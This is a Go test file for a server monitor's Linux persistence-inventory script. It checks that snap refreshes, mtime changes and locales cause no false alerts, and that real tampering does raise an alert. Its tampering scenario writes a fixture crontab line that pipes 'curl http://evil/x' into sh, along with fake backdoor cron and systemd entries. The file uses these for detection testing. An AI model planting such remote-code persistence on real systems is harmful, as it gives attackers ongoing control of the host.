package monitor

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/icaruszezen/ServerNeedSafe/internal/vault"
)

func extractPersistenceTestScript(t *testing.T, fakeRoot string) string {
	t.Helper()
	fullScript := buildDeepTelemetryScript(vault.DefaultMonitorSettings(), nil)

	startMarker := "# L3.2 Deterministic structured persistence inventory"
	endMarker := "# L3.3 Deterministic suspicious process cues"
	startIdx := strings.Index(fullScript, startMarker)
	endIdx := strings.Index(fullScript, endMarker)
	if startIdx < 0 || endIdx <= startIdx {
		t.Fatalf("could not locate L3.2 persistence block in generated script")
	}

	block := fullScript[startIdx:endIdx]
	// Strip the outer `fi` closing the `if [ "$SNS_SHA_MODE" != "0" ]; then` block before L3.3.
	if lastFi := strings.LastIndex(block, "\n  fi"); lastFi > 0 {
		block = block[:lastFi]
	}
	block = strings.Replace(block, `SNS_PROOT=""`, `SNS_PROOT="`+fakeRoot+`"`, 1)

	return `export LC_ALL=C LANG=C
sns_to() { shift; "$@" 2>/dev/null; }
SNS_SHA_MODE=0
if command -v sha256sum >/dev/null 2>&1; then SNS_SHA_MODE=1
elif command -v shasum >/dev/null 2>&1; then SNS_SHA_MODE=2
fi
echo "===SNS_SEC:SEC_DEEP==="
` + block + `
echo "===SNS_END==="
`
}

func runPersistenceCollector(t *testing.T, shPath, fakeRoot string, extraEnv []string) (string, *vault.ServerMonitorSnapshot) {
	t.Helper()
	script := extractPersistenceTestScript(t, fakeRoot)
	cmd := exec.Command(shPath, "-c", script)
	if len(extraEnv) > 0 {
		cmd.Env = append(os.Environ(), extraEnv...)
	}
	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("persistence script failed under %s: %v\noutput:\n%s", shPath, err, string(outBytes))
	}
	raw := string(outBytes)
	snap := &vault.ServerMonitorSnapshot{
		ServerID:       "srv-persist-test",
		CollectedAt:    time.Now().UTC(),
		CollectionTier: string(TierFull),
		Reachable:      true,
	}
	ParseDeepTelemetry(raw, snap, nil)
	return raw, snap
}

func mustWriteFile(t *testing.T, p, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", p, err)
	}
	if err := os.WriteFile(p, []byte(content), mode); err != nil {
		t.Fatalf("write %s: %v", p, err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatalf("chmod %s: %v", p, err)
	}
}

func mustSymlink(t *testing.T, target, linkPath string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(linkPath), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", linkPath, err)
	}
	_ = os.Remove(linkPath)
	if err := os.Symlink(target, linkPath); err != nil {
		t.Fatalf("symlink %s -> %s: %v", linkPath, target, err)
	}
}

func TestLinuxPersistenceScriptImmuneToEtcMtimeSnapMountsAndDetectsRealTampering(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("Linux shell persistence script execution test requires Linux")
	}

	root := t.TempDir()
	// Seed realistic Ubuntu persistence layout + unrelated /etc files (/etc/hosts, /etc/ld.so.cache)
	mustWriteFile(t, filepath.Join(root, "etc/hosts"), "127.0.0.1 localhost\n1.2.3.4 www.bt.cn\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/ld.so.cache"), "cache-v1", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/crontab"), "SHELL=/bin/sh\n17 * * * * root cd / && run-parts /etc/cron.hourly\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/rc.local"), "#!/bin/sh\nexit 0\n", 0o755)
	mustWriteFile(t, filepath.Join(root, "etc/cron.d/e2scrub_all"), "30 3 * * 0 root test -e /run/systemd/system\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/cron.d/.placeholder"), "# DO NOT EDIT\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/cron.hourly/.placeholder"), "# DO NOT EDIT\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/cron.daily/logrotate"), "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", 0o755)
	mustWriteFile(t, filepath.Join(root, "var/spool/cron/crontabs/root"), "0 2 * * * /usr/local/bin/backup.sh\n", 0o600)
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/custom-app.service"), "[Unit]\nDescription=App\n[Service]\nExecStart=/opt/app/bin\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/backup.timer"), "[Timer]\nOnCalendar=daily\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/sshd.service.d/override.conf"), "[Service]\nRestart=always\n", 0o644)
	mustSymlink(t, "/usr/lib/systemd/system/ssh.service", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/ssh.service"))
	mustSymlink(t, "/dev/null", filepath.Join(root, "etc/systemd/system/ssh.socket"))
	// Dynamic snapd mount units that rotate on every snap refresh
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/snap-core22-1621.mount"), "[Mount]\nWhat=/var/lib/snapd/snaps/core22_1621.snap\n", 0o644)
	mustSymlink(t, "/etc/systemd/system/snap-core22-1621.mount", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/snap-core22-1621.mount"))
	mustSymlink(t, "/etc/systemd/system/snap-core22-1621.mount", filepath.Join(root, "etc/systemd/system/snapd.mounts.target.wants/snap-core22-1621.mount"))

	// Baseline collection under /bin/sh
	raw1, snap1 := runPersistenceCollector(t, "/bin/sh", root, nil)
	if snap1.Security.PersistenceVersion != vault.CurrentPersistenceVersion {
		t.Fatalf("expected PersistenceVersion=%d, got %d\nraw:\n%s", vault.CurrentPersistenceVersion, snap1.Security.PersistenceVersion, raw1)
	}
	if snap1.Security.PersistenceHash == "" || len(snap1.Security.PersistenceItems) < 10 {
		t.Fatalf("expected populated v2 persistence items & hash, got hash=%q items=%+v", snap1.Security.PersistenceHash, snap1.Security.PersistenceItems)
	}
	// Verify NO '.', '..', or snap-*.mount ever appear in PersistenceItems
	for p := range snap1.Security.PersistenceItems {
		if strings.HasSuffix(p, "/.") || strings.HasSuffix(p, "/..") || strings.Contains(p, "snap-core22") {
			t.Fatalf("forbidden entry leaked into PersistenceItems: %q", p)
		}
	}

	// Store integration: seed baseline
	store, srv := setupTestMonitorStore(t)
	snap1.ServerID = srv.ID
	snap1.Security.FileHashes = map[string]string{"/etc/passwd": "pw-hash-1"}
	snap1.Security.UIDZeroUsers = []string{"root"}
	snap1.Security.FirewallStatus = "active"
	if trig, _, _, err := store.RecordMonitorSnapshots([]*vault.ServerMonitorSnapshot{snap1}); err != nil || len(trig) != 0 {
		t.Fatalf("seed baseline failed: trig=%+v err=%v", trig, err)
	}

	// --- Scenario 1: Simulate BT-Task `sed -i` on /etc/hosts + apt-daily-upgrade `ldconfig` replacing /etc/ld.so.cache
	//     + crossing 6-month ls timestamp boundary on files + bumping /etc and /etc/cron.d mtimes! ---
	if out, err := exec.Command("/bin/sh", "-c", `sed -i '/www.bt.cn/d' "`+filepath.Join(root, "etc/hosts")+`"`).CombinedOutput(); err != nil {
		t.Fatalf("sed -i /etc/hosts failed: %v (%s)", err, string(out))
	}
	// Atomic rename replacement for /etc/ld.so.cache (exactly what ldconfig does, bumping /etc mtime)
	mustWriteFile(t, filepath.Join(root, "etc/ld.so.cache~"), "cache-v2-after-apt-upgrade", 0o644)
	if err := os.Rename(filepath.Join(root, "etc/ld.so.cache~"), filepath.Join(root, "etc/ld.so.cache")); err != nil {
		t.Fatalf("atomic rename ld.so.cache: %v", err)
	}
	// Force distinct mtimes across >6 month boundary on /etc, /etc/cron.d, and persistence files themselves
	oldTime := time.Date(2020, 1, 15, 3, 4, 5, 0, time.UTC)
	newTime := time.Date(2026, 11, 29, 4, 5, 6, 0, time.UTC)
	_ = os.Chtimes(filepath.Join(root, "etc"), newTime, newTime)
	_ = os.Chtimes(filepath.Join(root, "etc/cron.d"), newTime, newTime)
	_ = os.Chtimes(filepath.Join(root, "etc/cron.d/e2scrub_all"), oldTime, oldTime)
	_ = os.Chtimes(filepath.Join(root, "etc/crontab"), oldTime, oldTime)

	// --- Scenario 2: Simulate snapd auto-refresh rotating snap-core22-1621.mount -> snap-core22-1663.mount ---
	_ = os.Remove(filepath.Join(root, "etc/systemd/system/snap-core22-1621.mount"))
	_ = os.Remove(filepath.Join(root, "etc/systemd/system/multi-user.target.wants/snap-core22-1621.mount"))
	_ = os.Remove(filepath.Join(root, "etc/systemd/system/snapd.mounts.target.wants/snap-core22-1621.mount"))
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/snap-core22-1663.mount"), "[Mount]\nWhat=/var/lib/snapd/snaps/core22_1663.snap\n", 0o644)
	mustSymlink(t, "/etc/systemd/system/snap-core22-1663.mount", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/snap-core22-1663.mount"))
	mustSymlink(t, "/etc/systemd/system/snap-core22-1663.mount", filepath.Join(root, "etc/systemd/system/snapd.mounts.target.wants/snap-core22-1663.mount"))

	// Re-collect under /bin/sh, bash, and varied locales -> ALL MUST match snap1 hash with ZERO drift!
	shells := []string{"/bin/sh"}
	if bashPath, err := exec.LookPath("bash"); err == nil {
		shells = append(shells, bashPath)
	}
	for _, sh := range shells {
		for _, loc := range []string{"C", "en_US.UTF-8", "zh_CN.UTF-8"} {
			_, snapQuiet := runPersistenceCollector(t, sh, root, []string{"LC_ALL=" + loc, "LANG=" + loc})
			if snapQuiet.Security.PersistenceHash != snap1.Security.PersistenceHash {
				t.Fatalf("hash drifted after /etc mtime & snap mount churn under %s (LC_ALL=%s): got %q want %q\ngot items=%+v\nwant items=%+v",
					sh, loc, snapQuiet.Security.PersistenceHash, snap1.Security.PersistenceHash, snapQuiet.Security.PersistenceItems, snap1.Security.PersistenceItems)
			}
			snapQuiet.ServerID = srv.ID
			snapQuiet.Security.FileHashes = map[string]string{"/etc/passwd": "pw-hash-1"}
			snapQuiet.Security.UIDZeroUsers = []string{"root"}
			snapQuiet.Security.FirewallStatus = "active"
			trig, _, _, err := store.RecordMonitorSnapshots([]*vault.ServerMonitorSnapshot{snapQuiet})
			if err != nil {
				t.Fatalf("RecordMonitorSnapshots quiet: %v", err)
			}
			if len(trig) != 0 {
				t.Fatalf("expected ZERO alerts after /etc mtime & snap refresh, got %+v", trig)
			}
		}
	}

	// --- Scenario 3: Shuffled PERSIST_ITEM line order produces identical hash ---
	lines := strings.Split(raw1, "\n")
	var itemLines []string
	for _, l := range lines {
		if strings.HasPrefix(l, "PERSIST_ITEM=") {
			itemLines = append(itemLines, l)
		}
	}
	slices.Reverse(itemLines)
	shuffledRaw := "===SNS_SEC:SEC_DEEP===\nPERSIST_VER=2\n" + strings.Join(itemLines, "\n") + "\n===SNS_END===\n"
	shuffledSnap := &vault.ServerMonitorSnapshot{ServerID: srv.ID, Reachable: true}
	ParseDeepTelemetry(shuffledRaw, shuffledSnap, nil)
	if shuffledSnap.Security.PersistenceHash != snap1.Security.PersistenceHash {
		t.Fatalf("expected shuffled PERSIST_ITEM order to yield identical hash: got %q want %q",
			shuffledSnap.Security.PersistenceHash, snap1.Security.PersistenceHash)
	}

	// --- Scenario 4: BusyBox / no-stat fallback (`ls -nd` mode extraction) yields identical hash! ---
	noStatDir := t.TempDir()
	writeExecutableStub(t, noStatDir, "stat", "exit 1")
	_, snapNoStat := runPersistenceCollector(t, "/bin/sh", root, []string{"PATH=" + noStatDir + ":" + os.Getenv("PATH")})
	if snapNoStat.Security.PersistenceHash != snap1.Security.PersistenceHash {
		t.Fatalf("expected no-stat ls -nd fallback to yield identical canonical hash: got %q want %q\ngot items=%+v\nwant items=%+v",
			snapNoStat.Security.PersistenceHash, snap1.Security.PersistenceHash, snapNoStat.Security.PersistenceItems, snap1.Security.PersistenceItems)
	}

	// --- Scenario 5: Real persistence tampering triggers alert with exact paths + advice evidence ---
	mustWriteFile(t, filepath.Join(root, "etc/cron.d/evil_cron"), "* * * * * root /tmp/evil.sh\n", 0o644)
	mustWriteFile(t, filepath.Join(root, "var/spool/cron/crontabs/root"), "0 2 * * * /usr/local/bin/backup.sh\n*/5 * * * * curl http://evil/x | sh\n", 0o600)
	if err := os.Remove(filepath.Join(root, "etc/systemd/system/custom-app.service")); err != nil {
		t.Fatalf("remove custom-app.service: %v", err)
	}
	mustWriteFile(t, filepath.Join(root, "etc/systemd/system/backup.timer"), "[Timer]\nOnCalendar=minutely\n", 0o644)
	mustSymlink(t, "/tmp/backdoor.service", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/ssh.service"))

	_, snapTampered := runPersistenceCollector(t, "/bin/sh", root, nil)
	snapTampered.ServerID = srv.ID
	snapTampered.Security.FileHashes = map[string]string{"/etc/passwd": "pw-hash-1"}
	snapTampered.Security.UIDZeroUsers = []string{"root"}
	snapTampered.Security.FirewallStatus = "active"

	trigTampered, _, _, err := store.RecordMonitorSnapshots([]*vault.ServerMonitorSnapshot{snapTampered})
	if err != nil {
		t.Fatalf("RecordMonitorSnapshots tampered: %v", err)
	}
	if len(trigTampered) != 1 || trigTampered[0].RuleKind != "security_file_drift" {
		t.Fatalf("expected 1 security_file_drift alert on real tampering, got %+v", trigTampered)
	}
	expectedDrifts := []string{
		"新增: /etc/cron.d/evil_cron",
		"修改: /etc/systemd/system/backup.timer",
		"修改: /etc/systemd/system/multi-user.target.wants/ssh.service (软链 -> /tmp/backdoor.service)",
		"修改: /var/spool/cron/crontabs/root",
		"删除: /etc/systemd/system/custom-app.service",
	}
	for _, want := range expectedDrifts {
		if !strings.Contains(trigTampered[0].Detail, want) {
			t.Fatalf("alert detail missing %q; full detail=%q", want, trigTampered[0].Detail)
		}
	}

	// Verify Alert Advice surfaces exact persistence drift paths in Evidence and MCP/AI prompts
	detailAfter, err := store.GetServerMonitorDetail(srv.ID, time.Hour)
	if err != nil || detailAfter.Snapshot == nil {
		t.Fatalf("GetServerMonitorDetail: %v", err)
	}
	adv := BuildAlertAdvice(trigTampered[0], detailAfter.Snapshot, nil)
	evidenceJoined := strings.Join(adv.Evidence, "\n")
	for _, want := range expectedDrifts {
		if !strings.Contains(evidenceJoined, want) {
			t.Fatalf("BuildAlertAdvice evidence missing %q; evidence=%+v", want, adv.Evidence)
		}
	}
}

func TestLinuxPersistenceScriptAlpineCrontabsDedupAndUnreadableFile(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("Linux shell persistence script execution test requires Linux")
	}

	root := t.TempDir()
	// Simulate Alpine layout: /etc/crontabs/root is the real file, /var/spool/cron/crontabs -> /etc/crontabs
	mustWriteFile(t, filepath.Join(root, "etc/crontabs/root"), "0 * * * * run-parts /etc/periodic/hourly\n", 0o600)
	mustSymlink(t, filepath.Join(root, "etc/crontabs"), filepath.Join(root, "var/spool/cron/crontabs"))
	// Simulate CentOS/RHEL layout file directly in /var/spool/cron/appuser
	mustWriteFile(t, filepath.Join(root, "var/spool/cron/appuser"), "*/10 * * * * /opt/job.sh\n", 0o600)

	// Unreadable file test (only meaningful when running as non-root)
	unreadablePath := filepath.Join(root, "etc/cron.d/root_only")
	if os.Geteuid() != 0 {
		mustWriteFile(t, unreadablePath, "secret cron\n", 0o000)
		t.Cleanup(func() { _ = os.Chmod(unreadablePath, 0o644) })
	}

	_, snap := runPersistenceCollector(t, "/bin/sh", root, nil)
	if _, ok := snap.Security.PersistenceItems["/etc/crontabs/root"]; !ok {
		t.Fatalf("expected /etc/crontabs/root collected on Alpine layout, got %+v", snap.Security.PersistenceItems)
	}
	if _, dup := snap.Security.PersistenceItems["/var/spool/cron/crontabs/root"]; dup {
		t.Fatalf("expected symlinked /var/spool/cron/crontabs -> /etc/crontabs deduplicated, got %+v", snap.Security.PersistenceItems)
	}
	if _, ok := snap.Security.PersistenceItems["/var/spool/cron/appuser"]; !ok {
		t.Fatalf("expected CentOS/RHEL /var/spool/cron/appuser collected, got %+v", snap.Security.PersistenceItems)
	}
	if os.Geteuid() != 0 {
		val := snap.Security.PersistenceItems["/etc/cron.d/root_only"]
		if !strings.HasSuffix(val, "|unreadable") {
			t.Fatalf("expected unreadable cron file recorded with |unreadable fingerprint, got %q", val)
		}
		// Bumping mtime on unreadable file must NOT change its fingerprint
		oldT := time.Date(2021, 5, 1, 0, 0, 0, 0, time.UTC)
		_ = os.Chtimes(unreadablePath, oldT, oldT)
		_, snap2 := runPersistenceCollector(t, "/bin/sh", root, nil)
		if snap2.Security.PersistenceHash != snap.Security.PersistenceHash {
			t.Fatalf("unreadable file mtime change caused hash drift: %q vs %q", snap2.Security.PersistenceHash, snap.Security.PersistenceHash)
		}
	}
}
